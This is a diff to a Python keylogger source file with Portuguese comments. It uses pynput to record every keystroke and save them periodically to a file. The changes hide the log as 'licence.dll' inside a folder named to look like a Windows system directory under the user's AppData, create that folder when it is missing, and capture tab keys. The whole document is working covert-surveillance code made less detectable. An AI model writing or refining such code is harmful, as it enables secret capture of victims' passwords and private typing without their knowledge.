@@ -1,6 +1,7 @@
 ###############################################################
 # Imports
 ###############################################################
+import os
 import time
 import threading
 from pynput import keyboard
@@ -8,9 +9,11 @@ from pynput import keyboard
 ###############################################################
 # Vars. Global
 ###############################################################
-_PATH = 'teste.dll'
+_PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
+_NAME = 'licence.dll'
 _KEYS = ''
 _AUTO_SAVE_TIME = 10
+_RUN = True
 _NUMBERS = {
     "96":"0",
     "97":"1",
@@ -30,18 +33,19 @@ _NUMBERS = {
 def auto_save():
     """
     Salva automaticamente o que o usuário digitou
-    dentro do tempo especificado em _AUTO_SAVE_TIME
+    dentro do tempo especificado em _AUTO_SAVE_TIME.
 
     Parameters:
         None
 
     Returns:
-         None
+        None
     """
     global _KEYS
     global _AUTO_SAVE_TIME
+    global _RUN
 
-    while True:
+    while _RUN:
         if len(_KEYS) > 0:
             write_on_file(_KEYS)
         time.sleep(_AUTO_SAVE_TIME)
@@ -55,7 +59,7 @@ def write_on_file(c):
         c (str): Conteudo que será gravado no arquivo.
 
     Returns:
-        Não é retornado nada!
+        None
     """
     global _PATH
     global _KEYS
@@ -93,15 +97,21 @@ def p_numbers(n):
 
 def on_press(key):
     global _KEYS
+    global _RUN
 
     # Encerra o programa
     if key == keyboard.Key.esc:
+        _RUN = False
         return False
 
     # Se apertar enter ele grava o que está digitado
     elif key == keyboard.Key.enter:
         _KEYS += ' \n'
         write_on_file(_KEYS)
+
+    # Adicionando espaço do TAB
+    elif key == keyboard.Key.tab:
+        _KEYS += '	'
 
     # Se Apertar o Espaço ele o adiciona
     elif key == keyboard.Key.space:
@@ -113,7 +123,7 @@ def on_press(key):
 
     # Se for qualquer outra tecla especial eu descarto ela !
     elif isinstance(key, keyboard.Key):
-        print('barrei algo')
+        pass
 
     # Se não for nenhuma das teclas selecionadas
     else:
@@ -126,20 +136,27 @@ def on_press(key):
         else:
             print('é numero')
             key = int(str(key).replace('<', '').replace('>', ''))
-            #key = int(key)
             _KEYS += str(p_numbers(key))
 
 ###############################################################
 # Main
 ###############################################################
 if __name__ == "__main__":
+
+    # Verifica se o caminho para gravar existe
+    if os.path.isdir(_PATH):
+        _PATH = os.path.join(_PATH, _NAME)
+    else:
+        os.mkdir(_PATH)
+        _PATH = os.path.join(_PATH, _NAME)
+
     # Cria um listener para capturar os eventos de teclado
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
+    th = [threading.Thread(target=auto_save()), threading.Thread(target=listener.join())]
 
-    th = threading.Thread(target=auto_save(), args='')
-    th.start()
-    th.join()
+    for i in range(0, len(th)):
+        th[i].start()
 
-    # Mantém o programa em execução, se retornar False na função, a exec encerra
-    listener.join()
+    for i in range(0, len(th)):
+        th[i].join()
